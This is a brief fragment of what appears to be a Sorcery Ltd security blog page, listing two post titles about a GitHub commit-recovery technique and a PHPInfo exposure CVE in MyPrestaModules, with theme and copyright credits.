[CFOR Exploit - Recovering Deleted and Private Github Commits](/posts/cfor_exploit/)

[PHPInfo Exposure in MyPrestaModules Modules CVE-2023-39677](/posts/myprestamodules_phpinfo/)

© Sorcery Ltd, 2024

Powered by [Hugo](https://gohugo.io/), theme [Anubis](https://github.com/mitrichius/hugo-theme-anubis).

Dark theme

[Sorcery Ltd](https://blog.sorcery.ie/)


